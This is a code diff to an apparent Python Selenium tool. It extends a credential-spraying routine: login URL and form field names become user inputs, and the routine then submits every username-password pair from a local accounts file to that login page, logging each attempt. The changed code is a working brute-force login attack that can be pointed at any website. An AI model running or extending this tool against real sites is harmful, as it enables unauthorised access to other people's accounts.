@@ -85,18 +85,19 @@ def select_browser():
         return
 
 
-def login(username, password):
+def login(username, password, login_url, username_pram, password_pram):
     try:
+        auth_url = url+login_url
         driver = select_browser() #Call function to set browser driver
-        driver.get (url) #URL is defined in universal variable from main()
+        driver.get (auth_url) #URL is defined in universal variable from main()
         #use credential dictionary file
-        driver.find_element_by_name('username').send_keys(username)
-        element = driver.find_element_by_name('password')
+        driver.find_element_by_name(f'{username_pram}').send_keys(username)
+        element = driver.find_element_by_name(f'{password_pram}')
         element.send_keys(password)
         element.send_keys(Keys.RETURN)
         time.sleep(1)
         # print(f'***SUCCESSFUL*** Login: {driver.current_url}, {username}, {password}\n')
-        print (f"Tried {username} and {password}\n")
+        print (f"Tried {username} and {password}\n from {driver.current_url}")
         driver.quit()
 
     except Exception as v:
@@ -156,6 +157,9 @@ def auto_surf(trials):
 
 
 def cred_spray():
+    login_url = str(input("Enter the login url: "))
+    username_pram = str(input("Enter the username parameter name: "))
+    password_pram = str(input("Enter the password parameter name: "))
     #Grap credentials from specified file and use for padding
     with open('./data/accounts.txt', 'r') as f:
         for line in f:
@@ -164,7 +168,7 @@ def cred_spray():
             password = combo[1]
             '''use the credentials within the login function to 
             brute force with the credentials'''
-            login(username, password)
+            login(username, password, login_url, username_pram, password_pram)
         return
 
 def load_test():
